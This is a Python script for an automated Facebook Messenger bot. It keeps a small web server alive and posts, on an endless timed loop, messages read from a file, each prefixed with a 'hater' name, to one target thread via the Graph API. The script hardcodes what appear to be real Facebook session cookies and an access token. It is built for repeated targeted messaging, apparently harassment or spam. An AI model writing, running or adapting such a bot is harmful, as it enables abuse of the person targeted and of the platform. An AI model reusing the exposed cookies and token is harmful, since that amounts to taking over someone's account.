import requests
import time
import os
import http.server
import socketserver
import threading
import sys

sys.stdout.reconfigure(line_buffering=True)

# --- CONFIGURATION ---
COOKIES = "datr=VCxEadrMIiRoNh_KemWrVxAL;sb=VSxEacopiEZzcPj9ci3QqY1m;ps_l=1;ps_n=1;m_pixel_ratio=2.8125;locale=hi_IN;pas=100070692953094%3AW1hyCD4KlR;vpd=v1%3B729x384x2.8125;c_user=100070692953094;fr=0x2Nu6To5T7ipJ9il.AWchxb59l_vqHxx0IQyFbBkJR-0zSUEJwtcUoJVQ4MTYOqInAa4.BpRCxV..AAA.0.0.BpRGbr.AWc9xH7fTu6l8EFYkaZ4kVnP09s;xs=23%3ABbLApTAx1uanOQ%3A2%3A1766090475%3A-1%3A-1;fbl_st=101327950%3BT%3A29434841;wl_cbv=v2%3Bclient_version%3A3023%3Btimestamp%3A1766090477;dpr=3.0921943187713623;presence=C%7B%22lm3%22%3A%22g.1373445670862571%22%2C%22t3%22%3A%5B%5D%2C%22utc3%22%3A1766090951232%2C%22v%22%3A1%7D;wd=1024x1944;alsfid={'id':'fcdd63754','timestamp':1766091088671.3};"
TOKEN = "EAABsbCS1iHgBQJFQrejx94HjJTpiD3QXzg7Hrl0oSpR5RY2CqtlZBp00arHCk9a67UAqVwmu9LMyQZCMd8Fzkjz08JeJYbzBjLiycDe5S8IcfBRXpiJc7kuGuWduzGqrXIMsHkpsEOs2jh3dqw4WMbWnFCPVgLsoMSmHQxpkkutISk666GUMmgPrndIhanrgZDZD"
TARGET_ID = "1373445670862571"

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"SERVER IS RUNNING")

def run_server():
    PORT = int(os.environ.get('PORT', 10000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        httpd.serve_forever()

def send_messages():
    print(">> STARTING BOT PROCESS <<", flush=True)
    try:
        with open('time.txt', 'r') as f: delay = int(f.read().strip())
        with open('haternames.txt', 'r') as f: hater = f.read().strip()
        with open('NP.txt', 'r') as f:
            messages = [m.strip() for m in f.readlines() if m.strip()]

        print(f"Target: {TARGET_ID} | Messages: {len(messages)}", flush=True)
        headers = {'User-Agent': 'Mozilla/5.0', 'Cookie': COOKIES}

        while True:
            for i, msg in enumerate(messages):
                url = f"https://graph.facebook.com/v15.0/t_{TARGET_ID}/messages"
                payload = {'message': f"{hater} {msg}", 'access_token': TOKEN}
                response = requests.post(url, data=payload, headers=headers)
                t = time.strftime("%I:%M:%S %p")
                if response.status_code == 200:
                    print(f"[{t}] SENT: {hater} {msg}", flush=True)
                else:
                    print(f"[{t}] FAILED: {response.status_code} - {response.text}", flush=True)
                time.sleep(delay)
    except Exception as e:
        print(f"FATAL ERROR: {e}", flush=True)

if __name__ == "__main__":
    threading.Thread(target=run_server, daemon=True).start()
    send_messages()
